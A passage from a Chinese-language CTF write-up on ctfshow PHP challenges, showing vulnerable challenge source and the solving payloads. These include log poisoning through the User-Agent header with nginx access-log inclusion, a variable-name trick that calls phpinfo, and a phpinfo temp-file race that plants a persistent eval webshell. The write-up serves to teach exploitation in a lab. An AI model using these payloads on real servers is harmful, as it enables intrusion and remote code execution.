        if ($file !== "index.php") {
            unlink($file);
        }
    }
}
```

```
GET: ?ctf=index.php show=

重写index，写个马进去 然后访问index POST:cmd=system('cat /ctfshow_fl0g_here.txt');
```

```php
<?php

include("flag.php");
error_reporting(0);
highlight_file(__FILE__);

class CTFSHOW{
    private $username;
    private $password;
    private $vip;
    private $secret;

    function __construct(){
        $this->vip = 0;
        $this->secret = $flag;
    }

    function __destruct(){
        echo $this->secret;
    }

    public function isVIP(){
        return $this->vip?TRUE:FALSE;
        }
    }

    function __autoload($class){
        if(isset($class)){
            $class();
    }
}

#过滤字符
$key = $_SERVER['QUERY_STRING'];
if(preg_match('/\_| |\[|\]|\?/', $key)){
    die("error");
}
$ctf = $_POST['ctf'];
extract($_GET);
if(class_exists($__CTFSHOW__)){
    echo "class is exists!";
}

if($isVIP && strrpos($ctf, ":")===FALSE){
    include($ctf);
}

```

```
文件包含非预期绕过

这题用extract()函数来进行变量的覆盖来满足if($isVIP && strrpos($ctf, ":")===FALSE)这个条件，get传入ctfshow?isVIP=Ture,再抓包通过向user-agent传入，最后post传入ctf=/var/log/nginx/access.log&a=system('cat flag.php');完工。
```

```php
<?php

include("flag.php");
error_reporting(0);
highlight_file(__FILE__);

class CTFSHOW{
    private $username;
    private $password;
    private $vip;
    private $secret;

    function __construct(){
        $this->vip = 0;
        $this->secret = $flag;
    }

    function __destruct(){
        echo $this->secret;
    }

    public function isVIP(){
        return $this->vip?TRUE:FALSE;
        }
    }

    function __autoload($class){
        if(isset($class)){
            $class();
    }
}

#过滤字符
$key = $_SERVER['QUERY_STRING'];
if(preg_match('/\_| |\[|\]|\?/', $key)){
    die("error");
}
$ctf = $_POST['ctf'];
extract($_GET);
if(class_exists($__CTFSHOW__)){
    echo "class is exists!";
}

if($isVIP && strrpos($ctf, ":")===FALSE && strrpos($ctf,"log")===FALSE){
    include($ctf);
}

```

```
这个题一点点小坑__autoload()函数不是类里面的
__autoload — 尝试加载未定义的类
最后构造?..CTFSHOW..=phpinfo就可以看到phpinfo信息啦
原因是..CTFSHOW..解析变量成__CTFSHOW__然后进行了变量覆盖，因为CTFSHOW是类就会使用
__autoload()函数方法，去加载，因为等于phpinfo就会去加载phpinfo
接下来就去getshell啦

exp :https://github.com/vulhub/vulhub/blob/master/php/inclusion/exp.py

web150plus
解答：php中变量名的点和空格会被转换成下划线。

payload：?..CTFSHOW..=phpinfo 原题说是需要条件竞争，所以flag改为了环境变量。phpinfo后查找即可获得。

在这里插入图片描述

这道题可以联系到web123。那道题里用的是CTF[SHOW.COM解析为CTF_SHOW.COM，是说对不符合规则的变量里只转换一次，变量名中的[也会被替换为_，但其后面的点.就不再进行替换了。

接下来学习一下原题的思路：（不过没做过原题，也不确定思路是不是这个，如果有不对的，还希望能帮忙指正~）

文件包含，在临时文件消失前包含它。

利用phpinfo（具体看一下“进一步学习”的三个链接，特别是第一个链接）。

phpinfo会打印上传临时文件的路径，包含临时文件就可以getshell。

先发送数据包给phpinfo页面，从返回页面中匹配出临时文件名，再将这个文件名发送给文件包含漏洞页面，进行getshell。临时文件在第一个请求phpinfo页面渲染加载完毕后会被删除。也就是说如果第一个请求结束，临时文件被删，第二个请求就无法进行包含了。

1）我们需要让phpinfo页面加载的慢一点。

phpinfo页面会将我们post的数据包里的header、get等信息都打印出来，所以我们要把这个数据包的header、get等位置塞满垃圾数据，加大phpinfo加载时间。

php发送数据是分包发送，默认的输出缓冲区大小为4096，即php每次返回4096个字节给socket连接。那么不管返回的信息是第几次，只要读取到的字符里包含临时文件名，就立即发送第二个数据包进行文件包含。

2）此时，发送的第一个数据包的socket连接还没结束，php还在继续每次输出4096个字节，临时文件还没有被删除。这时利用文件包含漏洞就可以成功包含临时文件getshell。

因为这个临时文件终归还是会被删除，所以直接上传是写一句话木马不可行，需要利用短暂的包含写入文件，将一句话木马写到如/tmp/jz，这样就不会被删除了。

<?php file_put_contents('/tmp/jz', '<?php @eval($_REQUEST[jz]);?>');?>
进一步学习：

PHP文件包含漏洞（利用phpinfo）（先看这个，原理详细还有exp）

phpinfo函数_文件包含之通过phpinfo去Getshell@weixin_39528994

文件包含&奇技淫巧@mob604756ebed9f

System：提供服务器所在的操作系统的信息。

$_SERVER['SERVER_ADDR']：真实ip

$_SERVER["CONTEXT_DOCUMENT_ROOT"]：网站根目录

disable_functions：禁用函数

$_FILES：临时文件路径

向phpinfo页面post恶意代码，可以在$_FILES中看到上传的临时文件，如果该网站存在文件包含漏洞，便可以将恶意代码存储我们已知的绝对路径去包含它getshell。
```
